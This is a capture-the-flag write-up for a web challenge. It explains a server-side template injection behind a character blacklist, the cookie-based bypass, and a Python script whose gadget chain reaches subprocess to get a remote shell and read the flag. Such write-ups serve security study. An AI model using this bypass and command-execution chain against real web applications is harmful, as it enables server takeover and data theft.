# http-for-pros (web, 200p, 43 solved)

## Description

```  
You have all the hints you need... Get the flag!

Flag format: CTF{sha256}  
```

In the task we get a webpage with some search form.

## Task analysis

It seems the form either echos our input, or in some cases sends back some
WAF-like error that certain character was blacklisted.  
It took us a while to notice that there is a template injection issue.  
If we send `{{3*3}}` we get back `9`.

## Template injection

Now also the whole blacklist makes sense!  
We need to bypass the blacklist and get RCE.

One of more problematic blocks is `_` and also `__class__`.

But there are some tricks we can use, for example we can use `request.args` to
access GET parameters, and we can use `[]` instead of `.` so for example
`request[request.args.x]` would do `request.__class__` of GET parameter
`x=__class__`.

It so happens that GET parameters were also subjected to blacklist.  
But cookies were not!

So following the same idea, we can do `request[request.cookies['a']]`, set
cookie `a=__class__` and we confirm it works.

### Gadget chain

Now we just need some decent gadget chain from `request`.  
First one we found was
`request._get_file_stream.im_func.func_globals['__builtins__']['__import__']`,
so we can craft it:

```python  
while True:  
   cmd = raw_input("sh> ")  
   params = {  
       "content": "{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'],shell=True)}}"  
   }  
   cookies = {  
       "a": "__class__",  
       "b": "_get_file_stream",  
       "c": "im_func",  
       "d": "func_globals",  
       "e": "__builtins__",  
       "f": "__import__",  
       "g": "check_output",  
       "h": cmd  
   }  
   r = get("http://35.198.103.37:31612/", params=params, cookies=cookies)  
   print(r.text)  
```

And we get a nice shell.  
From this we can just do `ls -la` and then `cat flag` to get:

```  
sh> ls -la  
total 32  
drwxr-xr-x 1 root root 4096 Dec  1 08:56 .  
drwxr-xr-x 1 root root 4096 Dec  1 08:56 ..  
-rw-r--r-- 1 dctf dctf  220 Aug 31  2015 .bash_logout  
-rw-r--r-- 1 dctf dctf 3771 Aug 31  2015 .bashrc  
-rw-r--r-- 1 dctf dctf  655 Jul 12  2019 .profile  
-rwxr-xr-x 1 root root 2699 Dec  1 08:55 app.py  
-rwxr-xr-x 1 root root   69 Dec  1 08:55 flag  
drwxr-xr-x 1 root root 4096 Dec  1 08:55 templates

sh> cat flag  
CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}  
```  

Original writeup
(https://github.com/TFNS/writeups/tree/master/2020-12-05-DefCampCTF/pros).